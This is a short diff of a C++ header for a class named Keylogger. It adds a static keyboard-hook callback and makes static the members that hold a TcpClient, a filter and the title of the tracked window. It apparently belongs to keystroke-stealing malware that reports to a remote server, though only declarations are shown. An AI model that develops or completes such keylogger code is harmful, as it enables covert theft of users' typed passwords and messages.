@@ -16,20 +16,22 @@ private:
 
 	static const std::vector<std::wstring> specialKeysNames;
 
-	Filter* filter;
-	TcpClient* client;
+	static Filter* filter;
+	static TcpClient* client;
 
-	BYTE states[256] = { 0 };
+	static BYTE states[256];
 
-	HWND hLastTrackedWindow = NULL;
-	bool titleUpdateRequest = false;
-	bool isWorthy = false;
-	std::wstring windowTitle;
+	static HWND hLastTrackedWindow;
+	static bool titleUpdateRequest;
+	static bool isWorthy;
+	static std::wstring lastTrackedWindowTitle;
+
+	static __declspec(dllexport) LRESULT CALLBACK KeyboardEventHandler(int nCode, WPARAM wParam, LPARAM lParam);
 
 public:
 	Keylogger(TcpClient* client, Filter* filter);
 	~Keylogger();
 
-	void logKeys();
+	void LogKeys();
 
 };
